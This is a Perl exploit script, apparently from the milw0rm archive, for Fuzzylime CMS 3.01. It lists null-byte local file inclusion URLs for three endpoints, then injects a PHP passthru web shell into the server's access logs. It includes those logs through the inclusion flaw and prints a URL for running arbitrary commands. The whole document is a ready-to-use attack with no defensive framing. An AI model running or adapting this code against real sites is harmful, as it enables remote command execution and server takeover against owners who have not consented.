#!/usr/bin/perl
# ----------------------------------------------------------
# Fuzzylime CMS 3.01 Multiple LFI / RCE
# author  : Cod3rZ
# website : http://cod3rz.helloweb.eu
# ----------------------------------------------------------
# http://[site]/blog.php?file=../[file]\0
# http://[site]/code/newsheads.php?heads=../[file]\0
# post
# http://[site]/code/commupdate.php (type=count&s=[file]\0)
# ----------------------------------------------------------
# LFI to RCE:
# ----------------------------------------------------------

use LWP::UserAgent;

 system("cls");
#system("clear");

 print " -------------------------------------------------\n";
 print " Fuzzylime CMS 3.01 LFI / RCE                     \n";
 print " Powered by Cod3rZ                                \n";
 print " http://cod3rz.helloweb.eu                        \n";
 print " -------------------------------------------------\n";
 print " Insert Site (http://site.com/):                  \n ";
 chomp($site = <STDIN>);
 print " -------------------------------------------------\n";
 print " Insert Logs path                                 \n ";
 chomp($path = <STDIN>);
 print " -------------------------------------------------\n";
 
 #Infect Logs
 $lwp = LWP::UserAgent->new;
 $siten = $site.'/blog.php?file=';
 $ua = $lwp->get($site.'coderz <?php passthru(stripslashes($_GET[cmd])); ?> /coderz');
 #Control
 $ua = $lwp->get($site.$path.'%00');
 if($ua->content =~ m/cod3rz/) {
 print " Ok ".$site." is infected                         \n";
 print " -------------------------------------------------\n";
 print " ".$siten.$path."&cmd=[command]\\0                 \n";
 print " -------------------------------------------------\n";
 }

# milw0rm.com [2008-07-07]